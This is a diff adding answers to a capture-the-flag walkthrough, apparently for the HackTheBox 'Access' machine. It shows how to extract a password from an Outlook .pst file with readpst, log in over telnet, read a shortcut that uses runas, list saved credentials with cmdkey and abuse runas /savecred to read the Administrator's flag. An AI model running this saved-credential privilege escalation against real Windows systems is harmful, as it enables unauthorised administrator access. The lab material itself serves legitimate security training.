@@ -88,7 +88,69 @@ Q4: What is the password for Access Control.zip?
 Q5: What is the password for the security user?
 - we get Access Control.pst file which is used to stored Microsoft Outlook data
 - install `pst-utls` tool to interact with `.pst` file
-- we can use `readpst` to convert `.pst` to kmail format then view it in kmail
+- we can use `readpst` to get the output 
+```
+# create a directory for the output to be stored
+$: mkdir mail
+# -o: output directory 
+# -S: input pst file
+$: readpst -o mail -S 'Access Control.pst'
+$: tree mail
+mail
+└── Access Control
+    └── 2
+# password is in the file named '2'
+```
+
+Q6: To which open TCP port on Access can we connect to get a shell after logging in as security?
+ - theres a open telnet port (23) we can try to connect to it 
+ - `telnet target_ip 23`
+ - once connected will prompt for username and password 
+ - login with password found in the pst file
+
+Q7: Submit the flag located on the security user's desktop.
+ -  after gaining shell access run below to get the flag
+ -  `type \Desktop\user.txt
+
+Q8: What is the name of the executable called by the link file on the Public desktop?
+ - there is a `.lnk` file located at `C:\Users\Public\Desktop`
+ - to see the file that its executing by using `type` similar to `cat`
+ - `type ZKAccess3.5 Security System.lnk`
+```
+PS C:\Users\Public\desktop> type "ZKAccess3.5 Security System.lnk"
+L?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\R1M?:Windows???:?▒M?:*wWindowsV1MV?System32???:?▒MV?*?System32▒X2P?:?
+                                                                                                           runas.exe???:1??:1?*Yrunas.exe▒L-K??E?C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%?
+                                                                                                                                       ?wN?▒?]N?D.??Q???`?Xaccess?_???8{E?3
+               O?j)?H???
+                        )??[?_???8{E?3
+                                      O?j)?H???
+                                               )??[?    ??1SPS??XF?L8C???&?m?e*S-1-5-21-953262931-566350628-63446256-500
+```
+ - the program thats executed is runas
+
+Q9: What Windows command, when given the /list option, will print information about the stored credentials available to the current user?
+ - the Windows command will print stored creds given /list flag is `cmdkeys` - read more on this check out `Windows Privilege Escalation -> Further Credential Theft` module from HTB Academy, goes in depth on this topic
+  
+Q10: What option can be given to the runas Windows command to have it use the saved credentials and run as that user? Include the leading /.
+- flag `/savecred` will use the saved cred instead of user input
+
+Q11: Submit the flag located on the administrator's desktop.
+- to get the root flag we will need to contruct the runas command to as below
+- running as Administrator to output the root.txt's content to another file 
+```
+PS C:\Users\Public\desktop> cmdkey /list
+
+Currently stored credentials:
+
+    Target: Domain:interactive=ACCESS\Administrator
+    Type: Domain Password
+    User: ACCESS\Administrator
+
+# runas as Administrator to get output from root.txt on C:\Users\Administrator\Desktop and save it to root.txt
+C:\Windows\System32\runas.exe /savecred /user:ACCESS\Administrator "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > root.txt"
+
+# get the flag
+cat C:\Windows\System32\root.txt
 ```
 
 
